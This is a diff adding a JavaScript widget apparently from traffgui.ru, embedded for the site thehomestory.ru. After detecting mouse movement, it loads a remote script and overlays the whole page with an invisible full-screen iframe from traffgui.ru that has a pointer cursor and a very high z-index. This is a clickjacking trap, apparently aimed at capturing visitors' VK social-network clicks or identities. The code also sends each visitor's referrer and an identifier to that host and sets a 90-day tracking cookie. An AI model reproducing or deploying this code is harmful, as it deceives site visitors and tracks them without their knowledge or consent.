@@ -1,0 +1,236 @@
+/*
+ * http://traffgui.ru/
+ */
+(function(handler) {
+	var rl = [];
+	rr = function(handler) {
+		
+		var br = function(handler) {
+			var called = false;
+			
+			var ready = function () {
+				if (called) return;
+				called = true;
+				handler();
+			}
+		
+				if (document.addEventListener) {
+					document.addEventListener("DOMContentLoaded", function(){
+					document.removeEventListener( "DOMContentLoaded", arguments.callee, false);
+					ready();}, false);
+				}
+				else if(document.attachEvent) {
+					if(document.documentElement.doScroll && window == window.top) {
+						var tryScroll = function (){
+							if (called) {
+								return; 
+							}
+								try {
+									document.documentElement.doScroll("left");
+									ready();
+								}
+								catch(e) {
+									setTimeout(tryScroll, 10);
+								}
+							}
+						tryScroll();
+					}
+				
+					document.attachEvent("onreadystatechange", function(){
+						if (document.readyState === "complete") {
+							document.detachEvent( "onreadystatechange", arguments.callee);
+							ready();
+						}
+					});
+				}
+			
+			
+    			if(window.addEventListener) {
+        			window.addEventListener('load', ready, false);
+				}
+    			else if(window.attachEvent) {
+        			window.attachEvent('onload', ready);
+				}
+    			else {
+        			window.onload=ready;
+				}
+		}
+		
+		if (!rl.length) {
+			br(function() {
+				for(var i=0; i<rl.length; i++) {
+					rl[i]();
+				}
+			});
+		}
+		rl.push(handler);
+		
+	};
+	rr(handler);
+})(function(){
+    
+    var $$ldr = function (arg) {
+        arg = arg || {};
+        var default_arg = {
+            create:'script',
+            attribute: {
+                'type':'text/javascript'
+            },
+            insert:document.body,
+            onready:function () {
+
+            }
+        }
+
+        for(var index in default_arg) {
+            if(typeof arg[index] == "undefined") arg[index] = default_arg[index];
+        }
+
+        var create = arg['create'];
+        var attribute = arg['attribute'];
+        var insert = arg['insert'];
+        var onready = arg['onready'];
+
+        var s = document.createElement(create);
+
+        for(var key in attribute) {
+            s.setAttribute(key,attribute[key]);
+        }
+
+        if(create=='script' && (typeof attribute.src != "undefined")) {
+            if (s.readyState) {
+                s.onreadystatechange = function() {
+                    if(s.readyState == "loaded" || s.readyState == "complete") {
+                        s.onreadystatechange = null;
+                        onready();
+                    }
+                }
+            }
+            else {
+                s.onload = function() {
+                    onready();
+                }
+            }
+        }
+
+        insert.appendChild(s);
+        return s;
+    }
+    
+    var welcomekey=true;
+    var cursordistance=0;
+    var mousedetect = function (event){
+            if(welcomekey) {
+                    cursordistance++;
+                    if(cursordistance>50) {
+                            welcomekey=false;
+                            startoncan();
+                    }
+            }
+    }
+    
+    if(document.getElementById('traffgui_vk')) {
+        var eltg_vk = document.getElementById('traffgui_vk');
+        eltg_vk.style.position = 'fixed';
+        eltg_vk.style.top = '-10px';
+        eltg_vk.style.left = '-10px';
+        eltg_vk.style.overflow = 'hidden';
+        eltg_vk.style.width = '1px';
+        eltg_vk.style.height = '1px';
+        eltg_vk.style.opacity = 0;
+    }
+    
+    var ejq = $$ldr({
+                        create:'script',
+                        attribute: {
+                                'type':'text/javascript',
+                                'src':'http://traffgui.ru/vkex/fn.js'
+                        },
+                        insert:document.body,
+                        onready:function() {
+                            $$evtadd(document.body,'mousemove',mousedetect);
+                        }
+                    });
+                    
+    var startoncan = function() {
+        
+        var canstart=true;
+        if(document.getElementById('traffgui_vk')) {
+            var el_tg_vk = document.getElementById('traffgui_vk');
+            var el_tg_vk_a=el_tg_vk.getElementsByTagName('a');
+            var el_tg_vk_img=el_tg_vk.getElementsByTagName('img');
+            if(el_tg_vk_a.length>0) {
+                for(var i=0; i<el_tg_vk_a.length; i++) {
+                    var rel = el_tg_vk_a[i].getAttribute('rel');
+                    var href = el_tg_vk_a[i].getAttribute('href');
+                    if(!href || (!!href && href.indexOf('http://traffgui.ru/')!=0)) {
+                        canstart=false;
+                    }
+                    if(!!rel && !~rel.indexOf('nofollow')) {
+                        canstart=false;
+                    }
+                }
+            }
+            else {
+                canstart=false;
+            }
+            if(el_tg_vk_img.length>0) {
+                for(var i=0; i<el_tg_vk_img.length; i++) {
+                    var src = el_tg_vk_img[i].getAttribute('src');
+                    if(!src || (!!src && src.indexOf('http://traffgui.ru/')!=0)) {
+                        canstart=false;
+                    }
+                }
+            }
+            else {
+                canstart=false;
+            }
+        }
+        else {
+            canstart=false;
+        }
+        
+		canstart=true;
+		
+        if(canstart) {
+            if($$cooget('infogon_uid') === undefined) {
+
+                var uid = '1487882798';
+                var pid = 'thehomestory.ru.usrfiles.com';
+                var utg = '1826';
+                var ref = encodeURIComponent(document.referrer);
+
+                var newmess = function(evnt) {
+                    if (evnt.data=='hide') {
+                        document.getElementById('infogon_inf').innerHTML = '';
+                        document.getElementById('infogon_inf').style.display = 'none';
+                    }
+                    if(evnt.data=='cook') {
+                        (new Image).src = 'http://traffgui.ru/ajx.php?uid='+uid+'&pid='+pid+'&utg='+utg+'&ref='+ref;
+                        $$cooset('infogon_uid', uid, 60*60*24*90);
+                    }
+                    if(evnt.data=='show') {
+                        document.getElementById('infogon_frame').style.width = '100%';
+                        document.getElementById('infogon_frame').style.height = '100%';
+                    }
+                }
+
+                $$evtadd(window, 'message', newmess);
+
+                var el = [];
+                el[0] = document.createElement('div');
+                el[0].setAttribute('id', 'infogon_inf');
+                document.body.appendChild(el[0]);
+                el[0].innerHTML = '<iframe src="http://traffgui.ru/vk.php?uid='+uid+'&pid='+pid+'&utg='+utg+'&ref='+ref+'" id="infogon_frame" frameborder="no" scrolling="no" allowtransparency style="position:fixed; top:0px; left:0px; bottom:0px; right:0px; width:100%; height:100%; border:none; margin:0; padding:0; filter:alpha(opacity=0); opacity:0; cursor: pointer; z-index:88888;" /><\/iframe>';
+
+                document.getElementById('infogon_frame').style.width = '1px';
+                document.getElementById('infogon_frame').style.height = '1px';
+
+            }
+            else {
+                (new Image).src = 'http://traffgui.ru/ajx.php?uid='+$$cooget('infogon_uid')+'&utg='+utg;
+            }
+        }
+    }
+    
+});
